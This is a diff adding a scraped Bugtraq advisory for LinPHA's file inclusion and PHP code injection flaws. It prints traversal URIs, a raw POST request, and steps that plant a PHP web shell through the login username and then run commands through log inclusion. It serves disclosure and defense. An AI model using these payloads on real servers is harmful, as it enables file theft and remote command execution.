@@ -1,0 +1,110 @@
+#SpeeDr00t@Black Falcon<br>#bid16592<p><b><span style="font-size: 18pt;">LinPHA Multiple Local File Inclusion and PHP Code Injection Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/16592/info">info</a><br><a href="http://www.securityfocus.com/bid/16592/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/16592/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/16592/solution">solution</a><br><a href="http://www.securityfocus.com/bid/16592/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				16592
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Feb 11 2006 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Feb 13 2006 05:18PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovery is credited to rgod.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					LinPHA LinPHA 0.9.4 <br/>
+					
+				
+					LinPHA LinPHA 0.9.3 <br/>
+					
+				
+					LinPHA LinPHA 0.9.2 <br/>
+					
+				
+					LinPHA LinPHA 0.9.1 <br/>
+					
+				
+					LinPHA LinPHA 0.9 .0<br/>
+					
+				
+					LinPHA LinPHA  1.0<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<br/>The following URI examples were provided for the file inclusion issues:<br/> <br/>http://www.example.com/host/docs/index.php?lang=/../../../../../../../../../../test<br/>http://www.example.com/path/install/install.php?language=/../../../../../../../test<br/>http://www.example.com/path/install/sec_stage_install.php?whatlang=1&amp;language=/../../../../../../../testhttp://target/path/install/sec_stage_install.php?language=/../../../../../../../test<br/><br/> <br/>The following HTTP POST example was provided for the file inclusion issues:<br/> <br/>POST pathinstall/forth_stage_install.php HTTP/1.1\r\n";<br/>Host: somehost<br/>Content-Type: application/x-www-form-urlencoded  <br/>Content-Length: data_length<br/>User-Agent: GameBoy, Powered by Nintendo<br/>Connection: Close<br/> <br/>language=/../../../../../../../../test<br/><br/> <br/>The file inclusion issues may allow for other system files to be retrieved if the 'magic_quotes_gpc' PHP directive is set to off.<br/> <br/>The following steps were provided to exploit the PHP code injection issues:<br/> <br/>1. Login with username: &lt;?php system($_GETcmd);?&gt;<br/>and password: whatever<br/> <br/>If the 'magic_quotes_gpc' is set to off, it is possible to launch operating system commands through the following request:<br/> <br/>http://www.example.com/path/docs/index.php?cmd=ls%20-la&amp;lang=/../../sql/tmp/linpha.log%00
+	
+		<ul>
+</ul>
+</div>
